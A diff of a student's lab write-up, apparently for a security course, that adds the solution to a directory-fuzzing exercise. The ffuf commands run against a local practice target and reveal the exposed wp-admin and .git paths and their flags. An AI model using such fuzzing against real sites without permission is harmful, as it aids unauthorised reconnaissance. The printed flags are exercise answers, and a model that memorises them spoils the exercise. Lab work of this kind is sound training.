@@ -219,7 +219,64 @@ Back to the drawing board.
 
 ## c) Solve dirfuzt-1
 
-yuyuyuogyu
+The idea for this exercise is to find a hidden dricetory in the provided sample file **dirfuzt-1**
+
+Let's download that, fuff, and the common.txt:
+
+```
+sudo apt-get update
+sudo apt-get install ffuf
+wget https://terokarvinen.com/2023/fuzz-urls-find-hidden-directories/dirfuzt-1
+chmod u+x dirfuzt-1
+wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt
+```
+
+Now that that's downloaded let's disable the internet connection and start *fuffing* like crazy to find the two URLS:
+* Admin page
+* Version control related page
+
+Opening the url we get greeted with a page like this:
+
+![h2-c-01](https://github.com/whatmurder/spring-ICI012AS3AE/blob/main/img/h2-c-01.png)
+
+Let's ffuf around and find out:
+
+We run the command `ffuf -w common.txt -u http://127.0.0.2:8000/FUZZ`
+
+![h2-c-02](https://github.com/whatmurder/spring-ICI012AS3AE/blob/main/img/h2-c-02.png)
+
+
+We got some usable information: The size of most of these are 154. We can use that in our next ffufs.
+
+Let's filter out the out ones with that size using the command `ffuf -w common.txt -u http://127.0.0.2:8000/FUZZ -fs 154`:
+
+This query found these pages:
+```
+.git                    [Status: 301, Size: 41, Words: 3, Lines: 3, Duration: 0ms]
+.git/config             [Status: 200, Size: 178, Words: 6, Lines: 11, Duration: 0ms]
+.git/HEAD               [Status: 200, Size: 178, Words: 6, Lines: 11, Duration: 0ms]
+.git/logs/              [Status: 200, Size: 178, Words: 6, Lines: 11, Duration: 0ms]
+.git/index              [Status: 200, Size: 178, Words: 6, Lines: 11, Duration: 0ms]
+render/https://www.google.com [Status: 301, Size: 64, Words: 3, Lines: 3, Duration: 0ms]
+wp-admin                [Status: 200, Size: 182, Words: 6, Lines: 11, Duration: 0ms]
+```
+
+![h2-c-03](https://github.com/whatmurder/spring-ICI012AS3AE/blob/main/img/h2-c-03.png)
+
+
+Let's check out the page called wp-admin first `http://127.0.0.2:8000/wp-admin`:
+
+![h2-c-04](https://github.com/whatmurder/spring-ICI012AS3AE/blob/main/img/h2-c-04.png)
+
+We got a hit, flag gained! `FLAG{tero-wpadmin-3364c855a2ac87341fc7bcbda955b580}`
+
+Now let's try those .git pages, starting with `http://127.0.0.2:8000/.git/`:
+
+![h2-c-05](https://github.com/whatmurder/spring-ICI012AS3AE/blob/main/img/h2-c-05.png)
+
+Another flag gained. `FLAG{tero-git-3cc87212bcd411686a3b9e547d47fc51}`
+
+I went through rest of the .git pages and they had the same flag, so safe to say we caught all the flags. Nice job me.
 
 ## d) Break into 020-your-eyes-only
 
@@ -254,6 +311,8 @@ https://www.geeksforgeeks.org/python/input-validation-in-python/
 https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html
 
 https://terokarvinen.com/2023/fuzz-urls-find-hidden-directories/
+
+https://github.com/danielmiessler/SecLists
 
 https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
 
